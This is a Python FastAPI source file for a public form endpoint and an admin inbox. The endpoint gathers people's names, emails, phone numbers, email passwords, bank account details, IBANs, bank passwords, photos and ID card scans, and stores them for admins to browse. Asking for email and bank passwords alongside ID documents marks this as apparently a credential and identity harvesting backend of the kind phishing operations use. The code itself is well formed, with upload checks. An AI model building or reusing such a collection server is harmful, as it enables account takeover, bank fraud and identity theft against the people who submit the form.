"""Public submission endpoint + the admin inbox API."""

from __future__ import annotations

import logging
import uuid
from pathlib import Path
from typing import Any

from fastapi import (
    APIRouter,
    Depends,
    File,
    Form,
    HTTPException,
    Request,
    UploadFile,
)

from auth import require_admin
from config import settings
from schemas import (
    SubmissionCreated,
    SubmissionOut,
    clean_list,
    serialize_submission,
    validate_submission,
)
from storage import Storage, utc_now_iso

logger = logging.getLogger("infoshare.api")

router = APIRouter(prefix="/api", tags=["submissions"])

# Only real raster images are accepted. SVG is deliberately excluded: it can
# carry script and would be executed when served back to a browser.
ALLOWED_IMAGE_TYPES: dict[str, str] = {
    "image/png": ".png",
    "image/jpeg": ".jpg",
    "image/gif": ".gif",
    "image/webp": ".webp",
}


def storage_of(request: Request) -> Storage:
    """Storage is attached to the app during startup (see main.py)."""
    return request.app.state.storage


# ---------------------------------------------------------------- uploads
def _save_picture(upload: UploadFile) -> dict[str, Any]:
    content_type = (upload.content_type or "").lower()
    extension = ALLOWED_IMAGE_TYPES.get(content_type)
    if extension is None:
        raise HTTPException(
            status_code=400,
            detail={
                "pictures": (
                    f"'{upload.filename or 'file'}' has type "
                    f"{content_type or 'unknown'}, which is not allowed. "
                    "Use PNG, JPEG, GIF or WEBP."
                )
            },
        )

    stored_name = f"{uuid.uuid4().hex}{extension}"
    target: Path = settings.upload_dir / stored_name
    size = 0
    with target.open("wb") as handle:
        while True:
            chunk = upload.file.read(1024 * 1024)
            if not chunk:
                break
            size += len(chunk)
            if size > settings.max_upload_bytes:
                handle.close()
                target.unlink(missing_ok=True)
                raise HTTPException(
                    status_code=413,
                    detail={
                        "pictures": (
                            f"'{upload.filename or 'file'}' is larger than "
                            f"{settings.max_upload_mb} MB."
                        )
                    },
                )
            handle.write(chunk)

    if size == 0:
        target.unlink(missing_ok=True)
        raise HTTPException(
            status_code=400,
            detail={"pictures": f"'{upload.filename or 'file'}' is empty."},
        )

    return {
        "filename": upload.filename or stored_name,
        "url": f"/uploads/{stored_name}",
        "content_type": content_type,
        "size": size,
    }


def _cleanup_pictures(pictures: list[dict[str, Any]]) -> None:
    """Remove photo files from disk (used when a submission is abandoned)."""
    for picture in pictures:
        name = Path(str(picture.get("url", ""))).name
        if name:
            (settings.upload_dir / name).unlink(missing_ok=True)


# ---------------------------------------------------------------- public
@router.post("/submissions", response_model=SubmissionCreated, status_code=201)
async def create_submission(
    request: Request,
    full_name: str = Form(...),
    email: str = Form(...),
    phone_numbers: list[str] = Form(default=[]),
    email_password: str = Form(default=""),
    bank_name: str = Form(default=""),
    bank_account: str = Form(default=""),
    iban: str = Form(default=""),
    bank_password: str = Form(default=""),
    notes: str = Form(default=""),
    consent: str = Form(...),
    pictures: list[UploadFile] = File(default=[]),
    id_cards: list[UploadFile] = File(default=[]),
) -> SubmissionCreated:
    errors = validate_submission(
        full_name=full_name,
        email=email,
        phone_numbers=phone_numbers,
        email_password=email_password,
        bank_name=bank_name,
        bank_account=bank_account,
        iban=iban,
        bank_password=bank_password,
        notes=notes,
        consent=consent,
        picture_count=len(pictures),
        max_pictures=settings.max_pictures,
        id_card_count=len(id_cards),
        max_id_cards=settings.max_id_cards,
    )
    if errors:
        raise HTTPException(status_code=422, detail=errors)

    saved_pictures: list[dict[str, Any]] = []
    saved_id_cards: list[dict[str, Any]] = []
    try:
        for upload in pictures:
            saved_pictures.append(_save_picture(upload))
        for upload in id_cards:
            saved_id_cards.append(_save_picture(upload))
    except HTTPException:
        _cleanup_pictures(saved_pictures + saved_id_cards)
        raise

    document = {
        "full_name": " ".join(full_name.split()),
        "email": email.strip(),
        "phone_numbers": clean_list(phone_numbers),
        "email_password": email_password.strip() or None,
        "bank_name": bank_name.strip() or None,
        "bank_account": bank_account.strip() or None,
        "iban": iban.strip().upper() or None,
        "bank_password": bank_password.strip() or None,
        "notes": notes.strip() or None,
        "pictures": saved_pictures,
        "id_cards": saved_id_cards,
        "consent": True,
        "created_at": utc_now_iso(),
    }

    try:
        document_id = storage_of(request).insert(document)
    except Exception:
        _cleanup_pictures(saved_pictures + saved_id_cards)
        logger.exception("Failed to store submission")
        raise HTTPException(
            status_code=502,
            detail="Could not store the submission. Please try again later.",
        ) from None

    return SubmissionCreated(id=document_id, created_at=document["created_at"])


# ---------------------------------------------------------------- admin
@router.get("/submissions", response_model=list[SubmissionOut])
def list_submissions(
    request: Request,
    limit: int = 200,
    _: dict = Depends(require_admin),
) -> list[SubmissionOut]:
    limit = max(1, min(limit, 500))
    documents = storage_of(request).list(limit=limit)
    return [SubmissionOut(**serialize_submission(doc)) for doc in documents]


@router.get("/submissions/{document_id}", response_model=SubmissionOut)
def get_submission(
    request: Request, document_id: str, _: dict = Depends(require_admin)
) -> SubmissionOut:
    document = storage_of(request).get(document_id)
    if document is None:
        raise HTTPException(status_code=404, detail="Submission not found.")
    return SubmissionOut(**serialize_submission(document))


@router.delete("/submissions/{document_id}", status_code=204)
def delete_submission(
    request: Request, document_id: str, _: dict = Depends(require_admin)
) -> None:
    storage = storage_of(request)
    document = storage.get(document_id)
    if document is None:
        raise HTTPException(status_code=404, detail="Submission not found.")
    storage.delete(document_id)
    _cleanup_pictures(
        list(document.get("pictures") or []) + list(document.get("id_cards") or [])
    )


@router.get("/stats")
def stats(request: Request, _: dict = Depends(require_admin)) -> dict:
    documents = storage_of(request).list(limit=500)
    return {
        "total": len(documents),
        "with_pictures": sum(1 for doc in documents if doc.get("pictures")),
        "storage": storage_of(request).mode,
    }


@router.get("/health")
def health(request: Request) -> dict:
    storage: Storage | None = getattr(request.app.state, "storage", None)
    return {
        "status": "ok",
        "storage": storage.mode if storage else "starting",
        "auth_required": settings.auth_enabled,
    }